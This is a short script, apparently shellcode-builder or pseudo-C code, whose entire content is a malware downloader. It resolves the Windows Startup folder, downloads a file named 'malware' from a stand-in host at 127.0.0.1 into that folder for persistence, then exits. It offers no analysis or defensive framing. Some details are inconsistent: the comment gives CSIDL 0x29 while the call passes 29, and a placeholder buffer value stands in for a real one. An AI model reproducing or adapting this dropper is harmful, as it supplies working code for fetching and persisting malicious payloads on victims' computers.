function URLDownloadToFileA("urlmon.dll");
function SHGetFolderPathA("shell32.dll");
function ExitProcess("kernel32.dll");

                // 0x29 = CSIDL_ALTSTARTUP
SHGetFolderPathA(0, 29, NULL, 0, 0x69696969);
URLDownloadToFileA(0,"http://127.0.0.1/malware","C:/Users/Alexa/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/malware2.txt",0,0);
ExitProcess(0);